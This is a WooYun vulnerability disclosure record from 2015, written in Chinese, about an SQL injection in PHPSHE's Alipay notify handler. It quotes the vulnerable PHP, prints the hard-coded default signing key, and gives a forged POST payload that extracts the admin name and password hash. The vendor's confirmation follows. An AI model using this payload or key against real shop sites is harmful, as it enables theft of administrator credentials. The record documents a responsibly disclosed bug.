{"id": 35583, "wybug_id": "wooyun-2015-0103612", "wybug_title": "phpshe最新版sql注入一枚", "wybug_corp": "phpshe.com", "wybug_author": "路人甲", "wybug_date": "2015-03-26 11:18", "wybug_open_date": "2015-06-25 11:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向公众公开  简要描述： rt 详细说明：  根据 WooYun: phpshe 最新版 sql注入。 。话说厂商确认，但是key还是没有随机生成发现还存在另外一处注入/include/plugin/payway/alipay/notify_url_sgn.php\n<?php/* * * 功能：支付宝服务器异步通知页面 * 版本：3.3 * 日期：2012-07-23 * 说明： * 以下代码只是为了方便商户测试而提供的样例代码，商户可以根据自己网站的需要，按照技术文档编写,并非一定要使用该代码。 * 该代码仅供学习和研究支付宝接口使用，只是提供一个参考。 *************************页面功能说明************************* * 创建该页面文件时，请留心该页面文件中无任何HTML代码及空格。 * 该页面不能在本机电脑测试，请到服务器上做测试。请确保外部可以访问该页面。 * 该页面调试工具请使用写文本函数logResult，该函数已被默认关闭，见alipay_notify_class.php中的函数verifyNotify * 如果没有收到该页面返回的 success 信息，支付宝会在24小时内按一定的时间策略重发通知  * 如何判断该笔交易是通过即时到帐方式付款还是通过担保交易方式付款？ *  * 担保交易的交易状态变化顺序是：等待买家付款→买家已付款，等待卖家发货→卖家已发货，等待买家收货→买家已收货，交易完成 * 即时到帐的交易状态变化顺序是：等待买家付款→交易完成 *  * 每当收到支付宝发来通知时，就可以获取到这笔交易的交易状态，并且商户需要利用商户订单号查询商户网站的订单数据， * 得到这笔订单在商户网站中的状态是什么，把商户网站中的订单状态与从支付宝通知中获取到的状态来做对比。 * 如果商户网站中目前的状态是等待买家付款，而从支付宝通知获取来的状态是买家已付款，等待卖家发货，那么这笔交易买家是用担保交易方式付款的 * 如果商户网站中目前的状态是等待买家付款，而从支付宝通知获取来的状态是交易完成，那么这笔交易买家是用即时到帐方式付款的 */include('../../../../common.php');require_once(\"alipay.config.php\");require_once(\"lib/alipay_notify.class.php\");//计算得出通知验证结果$alipayNotify = new AlipayNotify($alipay_config);$verify_result = $alipayNotify->verifyNotify();//验证成功if ($verify_result) {\t\t//商户订单号\t$out_trade_no = $_POST['out_trade_no'];\t//支付宝交易号\t$trade_no = $_POST['trade_no'];\t$info = $db->pe_select('order', array('order_id'=>$out_trade_no));\t//该判断表示买家已在支付宝交易管理中产生了交易记录，但没有付款\tif ($_POST['trade_status'] == 'WAIT_BUYER_PAY') {\t        echo \"success\";\t\t//请不要修改或删除    }\t//该判断表示买家已在支付宝交易管理中产生了交易记录且付款成功，但卖家没有发货\telseif ($_POST['trade_status'] == 'WAIT_SELLER_SEND_GOODS') {\t\tif ($info['order_state'] == 'notpay') {\t\t\t$order['order_outid'] = $trade_no;\t\t\t$order['order_payway'] = 'alipay_db';\t\t\t$order['order_state'] = 'paid';\t\t\t$order['order_ptime'] = time();\t\t\t\t\t$db->pe_update('order', array('order_id'=>$out_trade_no), $order);\t\t}        echo \"success\";\t\t//请不要修改或删除    }\t//该判断表示卖家已经发了货，但买家还没有做确认收货的操作\telseif ($_POST['trade_status'] == 'WAIT_BUYER_CONFIRM_GOODS') {\t\tif ($info['order_state'] == 'paid') {\t\t\t$order['order_state'] = 'send';\t\t\t$order['order_stime'] = time();\t\t\t\t\t\t\t\t$db->pe_update('order', array('order_id'=>$out_trade_no), $order);\t\t}\t        echo \"success\";\t\t//请不要修改或删除    }\t//该判断表示买家已经确认收货，这笔交易完成\telseif ($_POST['trade_status'] == 'TRADE_FINISHED') {\t\tif ($info['order_state'] == 'notpay') {\t\t\t$order['order_outid'] = $trade_no;\t\t\t$order['order_payway'] = 'alipay_js';\t\t\t$order['order_state'] = 'paid';\t\t\t$order['order_ptime'] = time();\t\t\t\t\t\t\t\t$db->pe_update('order', array('order_id'=>$out_trade_no), $order);\t\t}\t\telseif ($info['order_state'] == 'send') {\t\t\t$order['order_state'] = 'success';\t\t\t\t\t\t\t\t$db->pe_update('order', array('order_id'=>$out_trade_no), $order);\t\t}        echo \"success\";\t\t//请不要修改或删除    }\t//其他状态判断    else {        echo \"success\";    }}\n其中out_trade_no没过滤。但是要verify_result为真才会进入sql语句中\nfunction verifyNotify(){\t\tif(empty($_POST)) {//判断POST来的数组是否为空\t\t\treturn false;\t\t}\t\telse {\t\t//echo \"aa\";\t\t\t//生成签名结果\t\t\t$isSign = $this->getSignVeryfy($_POST, $_POST[\"sign\"]);\t\t\t//var_dump($isSign);\t\t\t//获取支付宝远程服务器ATN结果（验证是否是支付宝发来的消息）\t\t\t$responseTxt = 'true';\t\t\tif (! empty($_POST[\"notify_id\"])) {$responseTxt = $this->getResponse($_POST[\"notify_id\"]);}\t\t\t\t\t\t//写日志记录\t\t\t//if ($isSign) {\t\t\t//\t$isSignStr = 'true';\t\t\t//}\t\t\t//else {\t\t\t//\t$isSignStr = 'false';\t\t\t//}\t\t\t//$log_text = \"responseTxt=\".$responseTxt.\"\\n notify_url_log:isSign=\".$isSignStr.\",\";\t\t\t//$log_text = $log_text.createLinkString($_POST);\t\t\t//logResult($log_text);\t\t\t\t\t\t//验证\t\t\t//$responsetTxt的结果不是true，与服务器设置问题、合作身份者ID、notify_id一分钟失效有关\t\t\t//isSign的结果不是true，与安全校验码、请求时的参数格式（如：带自定义参数等）、编码格式有关\t\t\tif (preg_match(\"/true$/i\",$responseTxt) && $isSign) {\t\t\t\treturn true;\t\t\t} else {\t\t\t\treturn false;\t\t\t}\t\t}\t}\n然后跟进\nfunction getSignVeryfy($para_temp, $sign) {\t\t//除去待签名参数数组中的空值和签名参数\t\t$para_filter = paraFilter($para_temp);\t\t\t\t//对待签名参数数组排序\t\t$para_sort = argSort($para_filter);\t\t\t\t//把数组所有元素，按照“参数=参数值”的模式用“&”字符拼接成字符串\t\t$prestr = createLinkstring($para_sort);\t\t//echo \"getSignVeryfy\";\t\t//var_dump($this->alipay_config['key']);\t\t$isSgin = false;\t\tswitch (strtoupper(trim($this->alipay_config['sign_type']))) {\t\t\tcase \"MD5\" :\t\t\t\t$isSgin = md5Verify($prestr, $sign, $this->alipay_config['key']);\t\t\t\tbreak;\t\t\tdefault :\t\t\t\t$isSgin = false;\t\t}\t\t\t\treturn $isSgin;\t}\n其中key默认为\nesfsclzgahxncgzi3bbe7giwa2ywxyv3\n然后就是一个md5了。就可以通过验证。首先我们任意选择一件商品，然后选择支付宝付款\n\n然后记录下订单号\n\n然后到\nhttp://127.0.0.1/phpshe1.3/include/plugin/payway/alipay/notify_url_sgn.php\n然后根据上面的逻辑关系，构造如下post数据\nout_trade_no=1503250006&trade_no=11',user_address=(select concat(admin_name,0x7a,admin_pw) from pe_admin limit 1),user_phone='1&trade_status=WAIT_SELLER_SEND_GOODS&sign=7a6df532702e6aba67959314d24cd59d\n\n\n然后到订单中心可以看到注入结果\n\n   漏洞证明：  \n\n   修复方案：  话说你们确认，但是key还是没有随机生成。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-27 11:31 厂商回复： 感谢@路人甲 提供代码审计，已将漏洞提交到技术部附：上次漏洞已确认，新版已修复即将发布，1.3版本补丁会尽快更新，再次感谢@路人甲 提供代码审计 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}